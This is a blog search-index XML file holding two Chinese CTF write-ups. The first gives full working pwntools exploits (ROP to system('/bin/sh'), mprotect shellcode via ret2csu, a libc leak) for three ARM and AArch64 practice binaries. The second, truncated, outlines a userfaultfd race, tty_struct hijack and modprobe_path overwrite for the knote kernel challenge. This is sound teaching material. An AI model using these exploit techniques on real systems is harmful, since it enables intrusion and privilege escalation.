<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Arm pwn 初试</title>
      <link href="/2020/03/23/arm-pwn-chu-shi/"/>
      <url>/2020/03/23/arm-pwn-chu-shi/</url>
      
        <content type="html"><![CDATA[<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p> 安装binfmt和gdb-multiarch，binfmt会自动识别可执行文件的格式，然后传递其至相对应架构的qemu虚拟机，参考<a href="https://zh.wikipedia.org/wiki/Binfmt_misc" target="_blank" rel="noopener">https://zh.wikipedia.org/wiki/Binfmt_misc</a>。<br> gdb-multiarch是一个可以调试各种架构的gdb，就不需要自行编译target为不同架构的gdb了，十分方便。</p><pre class="line-numbers language-bash"><code class="language-bash">  <span class="token function">sudo</span> apt <span class="token function">install</span> <span class="token string">"binfmt*"</span>  <span class="token function">sudo</span> apt <span class="token function">install</span> gdb-multiarch<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p> 接着还需要安装不同架构的共享库。  </p><pre class="line-numbers language-bash"><code class="language-bash"> <span class="token function">sudo</span> apt <span class="token function">install</span> libc6-arm64-cross <span class="token function">sudo</span> apt <span class="token function">install</span> libc6-armel-cross <span class="token function">sudo</span> apt <span class="token function">install</span> libc6-armhf-cross<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p> 如果arm程序是动态链接的，则需要指定共享库的路径，上面我们安装的共享库默认存放在/usr/目录下。以aarch64即arm64为例子。  </p><pre class="line-numbers language-bash"><code class="language-bash"> qemu-aarch64 -L /usr/aarch64-linux-gnu binary_path<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p> 如果要想调试的话，加上-g port，然后使用gdb-multiarch远程调试。</p><pre class="line-numbers language-bash"><code class="language-bash"> qemu-aarch64 -L /usr/aarch64-linux-gnu -g 1234 binary_path<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="arm指令初识"><a href="#arm指令初识" class="headerlink" title="arm指令初识"></a>arm指令初识</h1><p> 这里我就不详细写了，资料有很多，而且主要熟悉一下基本的指令即可，参考链接<a href="https://www.jianshu.com/p/2f4a5f74ac7a" target="_blank" rel="noopener">https://www.jianshu.com/p/2f4a5f74ac7a</a>，等一下结合具体题目来学习。  </p><h1 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h1><p> 题目链接: <a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/arm" target="_blank" rel="noopener">https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/arm</a><br> 拿ctf-wiki上面的题目用来练手，目前只有rop的章节，有三道题目。</p><h2 id="typo"><a href="#typo" class="headerlink" title="typo"></a>typo</h2><pre class="line-numbers language-bash"><code class="language-bash"> $ checksec typo <span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/home/pkfcoding/arm_pwn/arm1/typo'</span>    Arch:     arm-32-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE <span class="token punctuation">(</span>0x8000<span class="token punctuation">)</span> $ <span class="token function">file</span> typo typo: ELF 32-bit LSB executable, ARM, EABI5 version 1 <span class="token punctuation">(</span>SYSV<span class="token punctuation">)</span>, statically linked, <span class="token keyword">for</span> GNU/Linux 2.6.32, BuildID<span class="token punctuation">[</span>sha1<span class="token punctuation">]</span><span class="token operator">=</span>211877f58b5a0e8774b8a3a72c83890f8cd38e63, stripped<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p> 架构为32位arm，没有开pie，没有canary，静态链接。ida打开，发现符号表被去掉了，只能通过猜或者rizzo来判断是啥函数。一开始只能定为start函数，但其实start函数会对main函数的地址有引用，再通过字符串也可以找到main函数的地址为.text:00008F00。漏洞点出现在读取字符串的时候的read函数，可以读取0x200个字节导致栈溢出。<br> <img src="0.png" alt="vuln"><br> 首先要想控制返回地址，我们得先了解一下arm的调用规则。进入函数后，首先被执行的是如下三条指令。  </p><pre class="line-numbers language-asm"><code class="language-asm"> .text:00008D24     STMFD   SP!, {R4,R11,LR} .text:00008D28     ADD     R11, SP, #8 .text:00008D2C     SUB     SP, SP, #0x74<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p> STMFD相当于push，ST就是store，M就是multi，F就是full，即栈顶指向栈顶元素，D就是Descending，表示栈往低地址方向增长。SP后面跟的!意思是，sp的值会跟着压栈的操作变化。压栈顺序从右往左。SP=SP-4*3。然后继续执行第二条指令，使得R11即bp等于SP+8，指向返回地址存放的地方。然后第三条指令，是分配函数的栈空间。再看看函数结束时的恢复指令。  </p><pre class="line-numbers language-asm"><code class="language-asm"> .text:00008DE0                 MOV     R0, R3 .text:00008DE4                 SUB     SP, R11, #8 .text:00008DE8                 LDMFD   SP!, {R4,R11,PC}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p> 第一条指令是将函数返回值赋给R0，随后，回收函数的栈空间使得SP指向R11-8，即存储R4的地址，随后LDMFD指令即为pop指令，从左往右将R4，R11，PC依次出栈。<br> 所以这里我们构造的payload应该为”a”*0x70 + retaddr。接下来的事情就是常规操作了，因为是静态链接，从rizzo插件中可以识别出来有system函数，我们只需找到一个gadget控制R0寄存器即可。</p><pre class="line-numbers language-bash"><code class="language-bash"> $ arm1 ropper --file ./typo --search <span class="token string">"pop {r0"</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> Load gadgets from cache <span class="token punctuation">[</span>LOAD<span class="token punctuation">]</span> loading<span class="token punctuation">..</span>. 100% <span class="token punctuation">[</span>LOAD<span class="token punctuation">]</span> removing double gadgets<span class="token punctuation">..</span>. 100% <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> Searching <span class="token keyword">for</span> gadgets: pop <span class="token punctuation">{</span>r0 <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> File: ./typo 0x00053078: pop <span class="token punctuation">{</span>r0, r1, r2, r3, r4, lr<span class="token punctuation">}</span><span class="token punctuation">;</span> bx ip<span class="token punctuation">;</span> 0x00053d64: pop <span class="token punctuation">{</span>r0, r1, r3, ip, lr<span class="token punctuation">}</span><span class="token punctuation">;</span> pop <span class="token punctuation">{</span>r2<span class="token punctuation">}</span><span class="token punctuation">;</span> ldr r1, <span class="token punctuation">[</span>r0, <span class="token comment" spellcheck="true">#4]; bx r1;</span> 0x00020904: pop <span class="token punctuation">{</span>r0, r4, pc<span class="token punctuation">}</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p> 0x20904即可满足条件，再来寻找”/bin/sh”的地址</p><pre class="line-numbers language-bash"><code class="language-bash"> $ ropper --file ./typo --string <span class="token string">"/bin/sh"</span> Strings <span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span> Address     Value -------     ----- 0x0006c384  /bin/sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p> exp如下：</p><pre class="line-numbers language-python"><code class="language-python"> <span class="token comment" spellcheck="true">#!/usr/bin/python</span> <span class="token comment" spellcheck="true">#-*- coding:UTF-8 -*-</span> <span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span> <span class="token keyword">import</span> sys context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span> context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span> <span class="token string">'split'</span><span class="token punctuation">,</span> <span class="token string">'-h'</span><span class="token punctuation">]</span> context<span class="token punctuation">.</span>binary <span class="token operator">=</span> <span class="token string">"./typo"</span> <span class="token keyword">if</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"r"</span><span class="token punctuation">:</span>     p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"127.0.0.1"</span><span class="token punctuation">,</span> <span class="token number">1234</span><span class="token punctuation">)</span> <span class="token keyword">elif</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"l"</span><span class="token punctuation">:</span>     p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"qemu-arm"</span><span class="token punctuation">,</span> <span class="token string">"./typo"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">else</span><span class="token punctuation">:</span>     p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"qemu-arm"</span><span class="token punctuation">,</span> <span class="token string">"-g"</span><span class="token punctuation">,</span> <span class="token string">"1234"</span><span class="token punctuation">,</span> <span class="token string">"./typo"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>     raw_input<span class="token punctuation">(</span><span class="token punctuation">)</span> elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./typo"</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 0x00020904: pop {r0, r4, pc};</span> gadget <span class="token operator">=</span> <span class="token number">0x20904</span> bin_sh <span class="token operator">=</span> <span class="token number">0x6c384</span> system_addr <span class="token operator">=</span> <span class="token number">0x110B4</span> p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Input ~ if you want to quit\n'</span><span class="token punctuation">)</span> p<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span> p<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x70</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>gadget<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>bin_sh<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0xdeadbeaf</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">)</span> p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><pre class="line-numbers language-bash"><code class="language-bash"> $ checksec pwn <span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/home/pkfcoding/arm_pwn/arm2/pwn'</span>    Arch:     aarch64-64-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE <span class="token punctuation">(</span>0x400000<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p> 架构为aarch64，没有pie和canary，为动态链接。用ida分析发现有一个明显的栈溢出漏洞，按照普通的方法应该去泄露libc地址，然后再执行一遍main来再一次溢出跳转至system，不过这里题目中特定引入了mprotect函数，那么我们就可以转而去执行mprotect函数使得bss段变为可执行段，然后在name中部署好shellcode，然后控制程序跳转至shellcode执行。我们这里使用第二种方法。难点就在于因为给的mprotect函数的参数如下<br> <img src="1.png" alt="mygift"><br> prot参数不符合我们的要求，我们应该设置其为7才行，因此需要用gadget来控制R2寄存器，因为找不到合适的gadget，于是便想起可以用ret2csu，找到init函数的gadget如下。<br> <img src="2.png" alt="gadget_csu"><br> 具体的流程我这里就不说了，可以看看ctf-wiki的ret2csu的章节，这里主要是学习一些汇编指令。</p><p> 上一题分析了arm的函数调用规范，现在我们在来看看aarch64的函数调用规范。这里拿main函数来举例。函数开始时</p><pre class="line-numbers language-asm"><code class="language-asm"> .text:0000000000400818        STP       X29, X30, [SP,#-0x10+var_s0]! .text:000000000040081C        MOV       X29, SP<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p> ST为store，P为pair，STP指令将X29存放在在SP-0x10，X30存放在在SP-0x8处，注意这条指令后面带有!，意思是SP会随着压栈的操作变化，即SP=SP-0x8。随后MOV指令更新X29为新的栈帧，由于main函数中没有局部变量，所以这里没有为main函数分配栈空间。函数结束返回时</p><pre class="line-numbers language-asm"><code class="language-asm"> .text:000000000040085C        LDP       X29, X30, [SP+var_s0],#0x10 .text:0000000000400860        RET<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p> 从SP+0x0处载入数据至X29，X30恢复栈帧和得到返回地址，然后再执行SP=SP+0x10，接着RET。</p><p> exp如下</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span><span class="token comment" spellcheck="true">#-*- coding:UTF-8 -*-</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>context<span class="token punctuation">.</span>binary <span class="token operator">=</span> <span class="token string">'./pwn'</span>gdbinit <span class="token operator">=</span> <span class="token triple-quoted-string string">'''    set architecture aarch64    target remote localhost:1234   '''</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./pwn"</span><span class="token punctuation">)</span><span class="token keyword">if</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"r"</span><span class="token punctuation">:</span>    p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"127.0.0.1"</span><span class="token punctuation">,</span> <span class="token number">1234</span><span class="token punctuation">)</span><span class="token keyword">elif</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"l"</span><span class="token punctuation">:</span>    p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"qemu-aarch64"</span><span class="token punctuation">,</span> <span class="token string">"-L"</span><span class="token punctuation">,</span> <span class="token string">"/usr/aarch64-linux-gnu"</span><span class="token punctuation">,</span> <span class="token string">"./pwn"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"qemu-aarch64"</span><span class="token punctuation">,</span> <span class="token string">"-L"</span><span class="token punctuation">,</span> <span class="token string">"/usr/aarch64-linux-gnu"</span><span class="token punctuation">,</span> <span class="token string">"-g"</span><span class="token punctuation">,</span> <span class="token string">"1234"</span><span class="token punctuation">,</span> <span class="token string">"./pwn"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    raw_input<span class="token punctuation">(</span><span class="token punctuation">)</span>shellcode <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>aarch64<span class="token punctuation">.</span>sh<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>shellcode_addr <span class="token operator">=</span> <span class="token number">0x411068</span>mprotect <span class="token operator">=</span> <span class="token number">0x4007D4</span>csu_gadget1 <span class="token operator">=</span> <span class="token number">0x4008CC</span>csu_gadget2 <span class="token operator">=</span> <span class="token number">0x4008AC</span>X21<span class="token operator">=</span>shellcode_addr <span class="token operator">+</span> <span class="token number">0x30</span>X22<span class="token operator">=</span><span class="token number">7</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Name:'</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>shellcode<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>mprotect<span class="token punctuation">)</span><span class="token punctuation">)</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x40</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0xdeadbeaf</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>csu_gadget1<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0xdeadbeaf</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>csu_gadget2<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>X21<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>X22<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0xdeadbeaf</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>shellcode_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="melong"><a href="#melong" class="headerlink" title="melong"></a>melong</h2><p>这道题给了libc和ld，需要把这两个放在/lib目录下，程序才可执行。</p><pre class="line-numbers language-bash"><code class="language-bash"> $ checksec melong <span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/home/pkfcoding/arm_pwn/arm3/melong'</span>    Arch:     arm-32-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE <span class="token punctuation">(</span>0x10000<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>漏洞点出现在write_diary函数，write_diary中会调用read，但是读的字节数是根据write_diary的第一个参数result的末尾字节，在main函数中result就是v7，而v7可以被PT函数赋值，在PT函数中，很容易发现只要对scanf输入为-1，即可绕过for循环返回-1，从而控制v7为0xffffffff，在write_diary中read就可以读取0xff个字节从而造成main函数的栈溢出。<br>利用的思路是，通过read之后的printf函数泄露libc的地址，然后通过gadget控制R0，返回值system函数。这就没啥好说的了。</p><p>exp如下</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span><span class="token comment" spellcheck="true">#-*- coding:UTF-8 -*-</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> sys sd <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>x<span class="token punctuation">)</span>sl <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>x<span class="token punctuation">)</span>slaf <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">,</span>y<span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span>rcv <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>x<span class="token punctuation">)</span>rcvu <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>x<span class="token punctuation">)</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span> <span class="token string">'split'</span><span class="token punctuation">,</span> <span class="token string">'-h'</span><span class="token punctuation">]</span>context<span class="token punctuation">.</span>binary <span class="token operator">=</span> <span class="token string">"./melong"</span><span class="token keyword">if</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"r"</span><span class="token punctuation">:</span>    p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"127.0.0.1"</span><span class="token punctuation">,</span> <span class="token number">1234</span><span class="token punctuation">)</span><span class="token keyword">elif</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"l"</span><span class="token punctuation">:</span>    p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"qemu-arm"</span><span class="token punctuation">,</span> <span class="token string">"./melong"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"qemu-arm"</span><span class="token punctuation">,</span> <span class="token string">"-g"</span><span class="token punctuation">,</span> <span class="token string">"1234"</span><span class="token punctuation">,</span> <span class="token string">"./melong"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    raw_input<span class="token punctuation">(</span><span class="token punctuation">)</span>pop_r0_pc <span class="token operator">=</span> <span class="token number">0x11bbc</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./melong"</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/lib/libc.so.6"</span><span class="token punctuation">)</span>slaf<span class="token punctuation">(</span><span class="token string">'Type the number:'</span><span class="token punctuation">,</span> <span class="token string">'1'</span><span class="token punctuation">)</span>sl<span class="token punctuation">(</span><span class="token string">'50'</span><span class="token punctuation">)</span>sl<span class="token punctuation">(</span><span class="token string">'50'</span><span class="token punctuation">)</span>slaf<span class="token punctuation">(</span><span class="token string">'Type the number:'</span><span class="token punctuation">,</span> <span class="token string">'3'</span><span class="token punctuation">)</span>slaf<span class="token punctuation">(</span><span class="token string">'take personal training?'</span><span class="token punctuation">,</span> <span class="token string">'-1'</span><span class="token punctuation">)</span>slaf<span class="token punctuation">(</span><span class="token string">'Type the number:'</span><span class="token punctuation">,</span> <span class="token string">'4'</span><span class="token punctuation">)</span>sd<span class="token punctuation">(</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x54</span><span class="token punctuation">)</span>rcvu<span class="token punctuation">(</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x54</span><span class="token punctuation">)</span>libcbase <span class="token operator">=</span> u32<span class="token punctuation">(</span>rcv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x17098</span>info<span class="token punctuation">(</span><span class="token string">"libcbase:%#x"</span> <span class="token operator">%</span>libcbase<span class="token punctuation">)</span>bin_sh <span class="token operator">=</span> libcbase <span class="token operator">+</span> <span class="token number">0x131bec</span>system <span class="token operator">=</span> libcbase <span class="token operator">+</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>slaf<span class="token punctuation">(</span><span class="token string">'Type the number:'</span><span class="token punctuation">,</span> <span class="token string">'4'</span><span class="token punctuation">)</span>sd<span class="token punctuation">(</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x54</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>pop_r0_pc<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>bin_sh<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token punctuation">)</span>slaf<span class="token punctuation">(</span><span class="token string">'Type the number:'</span><span class="token punctuation">,</span> <span class="token string">'6'</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p> 从这三道普通的rop pwn题来看，arm架构下的函数调用规范还是和x86下面的有很大差别的，汇编指令感觉没有x86这么易读，特别是有些细节需要注意比如说 !和arm32下的fp指向的是retaddr，而不是前函数的fp。</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF pwn arm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记录一道kernel pwn</title>
      <link href="/2020/03/19/ji-lu-yi-dao-kernel-pwn/"/>
      <url>/2020/03/19/ji-lu-yi-dao-kernel-pwn/</url>
      
        <content type="html"><![CDATA[<h1 id="D3CTF-knote复现"><a href="#D3CTF-knote复现" class="headerlink" title="D3CTF knote复现"></a>D3CTF knote复现</h1><p> 最近想拿一道kernel pwn题来学习，于是便想起去年D^3CTF中没有做出来的knote（太菜了。</p><h1 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h1><p> <img src="0.png" alt="vuln"><br> 漏洞点是在get和edit的函数中没有上锁，导致可以在kfree之后读写，是一个很典型的条件竞争漏洞。官方wp说可以用userfaultfd来控制race，不过之前没有接触过userfaultfd是啥，这次学习了一下。  </p><h1 id="userfaultfd介绍"><a href="#userfaultfd介绍" class="headerlink" title="userfaultfd介绍"></a>userfaultfd介绍</h1><p> 首先先来看看man手册对于userfaultfd的介绍<br> <a href="http://man7.org/linux/man-pages/man2/userfaultfd.2.html" target="_blank" rel="noopener">http://man7.org/linux/man-pages/man2/userfaultfd.2.html</a><br> 我简单的说一下大概意思，userfaultfd可以创建一个用来处理用户空间的page faults的文件描述符，要注意的是这个系统调用没有Glibc层次上的包装，当注册userfaultfd的线程遇到了特定区域的页错误时(特定区域在创建userfaultfd的时候指明)，会被put to sleep，userfaultfd会生成一个event，在page fault event被处理后原进程又会被唤醒。一般的应用场景是在多线程的环境下，A线程注册了userfaultfd的文件描述符，B线程对这个文件描述符使用poll进行监视， 然后A触发page fault进入阻塞，B接收到了event被唤醒，于是可以对出现page fault的页进行重新映射，从而对新的映射进行读写，所以A触发的读写page fault在B进程中被重新处理了，接着A线程继续恢复运行。之前Balsn CTF的一道kernel pwn也是使用了userfaultfd，参考了一下大佬的文章<a href="https://www.jianshu.com/p/a70a358ec02c" target="_blank" rel="noopener">https://www.jianshu.com/p/a70a358ec02c</a>，看了看exp具体是怎么写的。</p><h1 id="漏洞利用思路"><a href="#漏洞利用思路" class="headerlink" title="漏洞利用思路"></a>漏洞利用思路</h1><p> 首先看start.sh开启了smep和smap还有kaslr，所以我们需要借用UAF来泄露kernel的基地址，我们可以先add一个chunk，然后对其使用get函数触发page fault，在处理event的进程中再delete这个chunk，并且立即open ptmx来获得一个tty_struct。注意chunk的大小应该在0x200~0x400之间，因为tty_struct的大小是0x2e0，而alloc_tty_struct函数使用的是kzmalloc，实际上就是kmalloc，这样才能达到UAF的效果，最终将新申请出来的tty_struct里面的内容给读取出来，从而泄露kernel base。接下来就是要控制程序的执行流程了，一般而言我们可以使用UAF来覆写一个tty_struct结构，从而伪造tty_operations结构，然后使用ioctl或者write这些系统调用来获得一次控制程序执行流程的机会，官方的wp是使用ioctl来使得程序跳转至一个循环，然后再次通过一次race修改tty_struct从而改变gadget的逻辑来劫持rsp至physmap区域。我的一开始的想法是直接劫持程序流程至run_cmd，但是由于rdi指向的是tty_struct的首地址，而tty_struct的前4个字节是magic，修改了会过不了检查，于是便想找一个gadget来绕过。最终找到了一个这样的gadget。  </p><p> <img src="1.png" alt="gadget1">  </p><p> <img src="2.png" alt="gadget2">  </p><p> 这样我们可以将tty_struct+0x20设置为run_cmd的地址，然后将tty_struct+0x30设置为指向脚本的绝对路径字符串的指针，从而可以顺利得执行run_cmd，从而以root权限执行我们指定的脚本来得到flag，可是不知道为啥我在调试的过程中，call_usermodehelper这个函数总是执行失败，试了很久，仍然不知道为啥（太菜了。于是我转而去寻找另外一种思路，利用kmalloc类似于fastbin attack的特征修改fd来实现任意地址写，去修改modprobe_path，然后在执行一个错误的elf文件来触发call_modprobe函数执行，参考了<a href="http://blog2.eonew.cn/archives/20" target="_blank" rel="noopener">http://blog2.eonew.cn/archives/20</a>，感谢大佬Orz。<br> call_usermodehelper_exec()函数，效果和run_cmd类似，其实run_cmd也是执行call_usermodehelper_exec()这个函数，但和call_modprobe区别是，wait参数值不一样。  </p><ul><li><p>call_modprobe的wait参数：UMH_KILLABLE | UMH_WAIT_PROC  </p></li><li><p>run_cmd的wait参数是：UMH_WAIT_EXEC  </p><p><img src="3.png" 